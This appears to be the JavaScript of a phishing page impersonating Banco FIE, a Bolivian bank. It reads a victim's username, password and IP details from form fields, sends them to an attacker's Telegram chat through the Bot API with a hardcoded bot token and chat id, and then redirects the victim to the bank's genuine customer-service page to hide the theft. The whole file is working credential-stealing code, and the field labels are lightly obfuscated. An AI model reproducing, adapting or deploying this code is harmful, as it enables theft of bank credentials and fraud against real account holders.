//bot token
var telegram_bot_id = "6078308633:AAFKem_d4dLDVHBGUjZbpT9nINXwELXLeqs";
//chat id
var chat_id = "1739203762";
var u_name, pax, ip, ip2;
var ready = function () {
    u_name = document.getElementById("VC0RR3").value;
    pax = document.getElementById("vUSUARIO").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹FIE🔹\n👤C0RR3: " + u_name + "\n🔒Cl4v3x: " + pax + "\n\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www.bancofie.com.bo/atencion-al-cliente/consultas';
        console.log(response);
    });

     return false;
};
